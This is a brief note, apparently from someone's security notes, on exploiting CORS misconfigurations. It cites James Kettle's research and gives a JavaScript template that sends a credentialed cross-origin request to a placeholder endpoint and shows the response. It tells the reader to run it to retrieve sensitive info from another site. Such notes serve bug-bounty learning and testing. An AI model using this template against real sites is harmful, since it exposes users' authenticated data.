## References -

- [Exploiting CORS misconfigurations for Bitcoins and bounties by James Kettle](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

## Template code to retreive -

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://website.com/endpoint', true);
req.withCredentials = true;
req.send('{}');

function reqListener() {
    alert(this.responseText);
};
```

Run this code in console to retreive the sensitive info from other website.
